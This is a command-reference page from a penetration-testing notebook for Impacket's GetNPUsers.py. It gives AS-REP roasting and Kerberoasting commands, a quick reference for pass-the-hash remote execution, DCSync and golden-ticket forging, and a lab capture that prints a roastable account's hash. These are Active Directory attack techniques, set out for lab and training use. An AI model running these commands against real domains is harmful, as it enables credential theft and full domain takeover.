---
title: "GetNPUsers.py"
sidebarTitle: "GetNPUsers.py"
description: "Check accounts without Kerberos preauthentication."
keywords: ["GetNPUsers", "GetNPUsers.py", "impacket-GetNPUsers"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/getnpusers.md. Edit the Markdown source, then run scripts/sync_site.py. */}

Replace UPPER_CASE values with your lab values.

[Search this tool’s saved examples](/commands/notebook?tool=getnpusers) · [All tools](/index)

## Commands

**Kali**

```bash
impacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
```

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

5 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="AS-REP Roasting: Quick Reference">

### AS-REP Roasting: Quick Reference

**AS-REP Roasting: Quick Reference**

```bash
# Linux (Impacket) — with a userlist (no creds) or authenticated
GetNPUsers.py $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
GetNPUsers.py $DOMAIN/USER:PASS -dc-ip $DC -request         # authenticated: find them all
nxc ldap $DC -u USER -p PASS --asreproast asrep.hash
```

</Accordion>

<Accordion title="Kerberos / Spns">

### Kerberos / Spns

**Active Directory Enumeration Commands**

```bash
GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
    # Find user accounts with registered SPNs

GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
    # Request TGS tickets for Kerberoasting

GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass
    # Find accounts vulnerable to AS-REP roasting

GetNPUsers.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
    # Query for AS-REP roastable accounts using credentials
```

</Accordion>

<Accordion title="Original captured examples">

### Original captured examples

**Impacket: Script Quick Reference**

```bash
# remote execution (need admin creds or hash)
psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
smbexec.py / atexec.py / dcomexec.py        # alternatives
# credentials
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
# tickets
getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
# shares / lookups
smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
```

</Accordion>

<Accordion title="Hunting for Users with Kerberos Pre-auth Not Required">

### Hunting for Users with Kerberos Pre-auth Not Required

**Miscellaneous Misconfigurations**

```shellsession
grcic550@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$
[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set

<SNIP>
```

</Accordion>

<Accordion title="Impacket: Script Quick Reference">

### Impacket: Script Quick Reference

**Impacket: Script Quick Reference**

Context from the notebook: Kerberos GetUserSPNs.py ,  GetNPUsers.py ,  getTGT.py ,  getST.py Kerberos tools

```text
GetNPUsers.py
```

</Accordion>

</AccordionGroup>
